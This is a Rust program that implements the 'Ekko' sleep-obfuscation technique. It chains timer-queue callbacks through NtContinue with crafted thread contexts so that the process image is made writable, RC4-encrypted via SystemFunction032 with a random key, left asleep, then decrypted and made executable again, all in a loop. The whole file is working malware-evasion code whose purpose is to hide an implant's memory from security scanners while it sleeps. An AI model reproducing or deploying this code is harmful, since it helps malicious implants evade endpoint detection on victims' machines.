#![allow(non_snake_case)]
use ntapi::ntexapi::NtCreateEvent;
use ntapi::ntobapi::{NtSignalAndWaitForSingleObject, NtWaitForSingleObject};
use ntapi::ntrtl::{RtlCreateTimerQueue, RtlDeleteTimerQueue};
use ntapi::ntxcapi::NtContinue;
use ntapi::winapi::ctypes::c_void;
use std::arch::x86_64::_rdrand32_step;
use std::ptr::null_mut;
use windows_sys::Win32::Foundation::{CloseHandle, NTSTATUS};
use windows_sys::Win32::System::Diagnostics::Debug::{RtlCaptureContext, WaitForDebugEvent};
use windows_sys::Win32::System::Kernel::NotificationEvent;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualProtect};
use windows_sys::Win32::System::Threading::{
    EVENT_ALL_ACCESS, GetCurrentProcess, INFINITE, WT_EXECUTEINTIMERTHREAD, WaitForSingleObject,
    WaitForSingleObjectEx,
};
use windows_sys::Win32::System::{
    Diagnostics::Debug::{CONTEXT, IMAGE_NT_HEADERS64},
    LibraryLoader::GetModuleHandleA,
    SystemServices::IMAGE_DOS_HEADER,
};
use windows_sys::core::BOOL;

unsafe extern "system" {
    fn RtlCreateTimer(
        TimerQueueHandle: *mut c_void,
        Handle: *mut *mut c_void,
        Function: *const c_void,
        Context: *const c_void,
        DueTime: u32,
        Period: u32,
        Flags: u32,
    ) -> NTSTATUS;
    fn SetEvent(hevent: *mut c_void) -> BOOL;
}

fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

struct STRING {
    len: u32,
    max_len: u32,
    buffer: *mut u8,
}

#[cfg(any(target_arch = "x86_64"))]
fn gen_random() -> u32 {
    unsafe {
        let mut seed: u32 = 0;
        _rdrand32_step(&mut seed);
        seed
    }
}

fn ekko(time: u32) {
    unsafe {
        let mut ctx_init: CONTEXT = CONTEXT::default();
        let mut key: [u8; 16] = [0; 16];
        let mut queue: *mut c_void = null_mut();
        let mut timer: *mut c_void = null_mut();
        let mut delay: u32 = 0;
        let mut event_start: *mut c_void = null_mut();
        let mut event_timer: *mut c_void = null_mut();
        let mut event_end: *mut c_void = null_mut();
        let mut value: u32 = 0;

        let image_base: *mut _ = GetModuleHandleA(null_mut());
        let dos_header: *const IMAGE_DOS_HEADER = image_base as *const IMAGE_DOS_HEADER;
        let nt_header: *const IMAGE_NT_HEADERS64 =
            (image_base as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        let image_size = (*nt_header).OptionalHeader.SizeOfImage as usize;

        let advapi32 = LoadLibraryA("advapi32.dll\0".as_ptr() as *const u8);
        if advapi32.is_null() {
            println!("[-] Failed to load advapi32.dll");
            return;
        }

        let systemfunction032 =
            GetProcAddress(advapi32, "SystemFunction032\0".as_ptr() as *const u8).unwrap()
                as *mut c_void;
        if systemfunction032.is_null() {
            println!("[-] Failed to get address of SystemFunction032");
            return;
        }

        for i in 0..16 {
            key[i] = gen_random() as u8;
        }

        let mut key_buffer: STRING = STRING {
            len: 16,
            max_len: 16,
            buffer: key.as_mut_ptr(),
        };

        let mut image: STRING = STRING {
            len: image_size as u32,
            max_len: image_size as u32,
            buffer: image_base as *mut u8,
        };

        if !nt_success(RtlCreateTimerQueue(&mut queue)) {
            println!("[-] RtlCreateTimerQueue failed");
            return;
        }

        if !nt_success(NtCreateEvent(
            &mut event_timer,
            EVENT_ALL_ACCESS,
            null_mut(),
            NotificationEvent as u32,
            0,
        )) || !nt_success(NtCreateEvent(
            &mut event_start,
            EVENT_ALL_ACCESS,
            null_mut(),
            NotificationEvent as u32,
            0,
        )) || !nt_success(NtCreateEvent(
            &mut event_end,
            EVENT_ALL_ACCESS,
            null_mut(),
            NotificationEvent as u32,
            0,
        )) {
            println!("[-] Failed to create events");
            return;
        }

        println!("[+] Starting sleep for {} milliseconds", time);

        delay += 100;
        if nt_success(RtlCreateTimer(
            queue,
            &mut timer as *mut _ as *mut _,
            RtlCaptureContext as *const _,
            &mut ctx_init as *mut _ as *const _,
            delay,
            0,
            WT_EXECUTEINTIMERTHREAD,
        )) {
            delay += 100;
            if nt_success(RtlCreateTimer(
                queue,
                &mut timer,
                SetEvent as *const _,
                event_timer as *mut _,
                delay,
                0,
                WT_EXECUTEINTIMERTHREAD,
            )) {
                if !nt_success(NtWaitForSingleObject(event_timer, 0, null_mut())) {
                    println!("[-] Failed to wait for event timer");
                    return;
                }

                let mut ctx: [CONTEXT; 7] = [ctx_init; 7];
                for i in 0..7 {
                    ctx[i].Rsp -= 8;
                }

                ctx[0].Rip = WaitForSingleObjectEx as u64;
                ctx[0].Rcx = event_start as u64;
                ctx[0].Rdx = INFINITE as u64;
                ctx[0].R8 = 0;

                ctx[1].Rip = VirtualProtect as u64;
                ctx[1].Rcx = image_base as u64;
                ctx[1].Rdx = image_size as u64;
                ctx[1].R8 = PAGE_READWRITE as u64;
                ctx[1].R9 = &mut value as *mut _ as u64;

                ctx[2].Rip = systemfunction032 as u64;
                ctx[2].Rcx = &mut image as *mut _ as u64;
                ctx[2].Rdx = &mut key_buffer as *mut _ as u64;

                ctx[3].Rip = WaitForSingleObjectEx as u64;
                ctx[3].Rcx = GetCurrentProcess() as u64;
                ctx[3].Rdx = time as u64;
                ctx[3].R8 = 0;

                ctx[4].Rip = systemfunction032 as u64;
                ctx[4].Rcx = &mut image as *mut _ as u64;
                ctx[4].Rdx = &mut key_buffer as *mut _ as u64;

                ctx[5].Rip = VirtualProtect as u64;
                ctx[5].Rcx = image_base as u64;
                ctx[5].Rdx = image_size as u64;
                ctx[5].R8 = PAGE_EXECUTE_READ as u64;
                ctx[5].R9 = &mut value as *mut _ as u64;

                ctx[6].Rip = SetEvent as u64;
                ctx[6].Rcx = event_end as u64;

                for i in 0..7 {
                    delay += 100;
                    if !nt_success(RtlCreateTimer(
                        queue,
                        &mut timer,
                        NtContinue as *const _,
                        &mut ctx[i] as *mut _ as *const _,
                        delay,
                        0,
                        WT_EXECUTEINTIMERTHREAD,
                    )) {
                        return;
                    }
                }

                println!("[+] Sleeping for {} milliseconds", time);
                NtSignalAndWaitForSingleObject(event_start, event_end, 0, null_mut());
                println!("[+] Finished sleeping for {} milliseconds", time);
            }
        }

        if queue != null_mut() {
            RtlDeleteTimerQueue(queue);
        }
        if event_timer != null_mut() {
            CloseHandle(event_timer as *mut _);
        }
        if event_start != null_mut() {
            CloseHandle(event_start as *mut _);
        }
        if event_end != null_mut() {
            CloseHandle(event_end as *mut _);
        }
    }
}

fn main() {
    loop {
        ekko(1000);
    }
}
